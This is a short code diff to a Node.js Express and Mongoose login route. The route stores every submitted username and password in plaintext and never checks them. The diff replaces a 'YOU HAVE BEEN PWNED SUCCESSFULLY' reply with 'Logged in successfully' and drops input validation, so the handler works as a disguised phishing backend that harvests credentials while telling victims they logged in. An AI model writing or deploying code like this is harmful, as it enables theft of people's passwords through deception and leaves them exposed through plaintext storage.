@@ -28,23 +28,16 @@ const userSchema = new mongoose.Schema({
 const User = mongoose.model("User", userSchema);
 
 // Routes
-app.post("/login", async (req, res) => {
-  console.log("POST /login");
-  console.log("Request Body:", req.body);
-
-  const { username, password } = req.body;
-
+app.post('/login', async (req, res) => {
   try {
-    if (!username || !password) {
-      return res.status(400).send("Username and password are required");
-    }
-
+    const { username, password } = req.body;
     const newUser = new User({ username, password });
     await newUser.save();
-    res.status(200).send("YOU HAVE BEEN PWNED SUCCESSFULLY 💅");
+    console.log('User saved successfully to MongoDB!');
+    res.status(200).send('Logged in successfully');
   } catch (err) {
-    console.error("Error saving user:", err);
-    return res.status(500).send("Error saving user to database");
+    console.error('Error saving user:', err);
+    res.status(500).send('Error saving user');
   }
 });
 
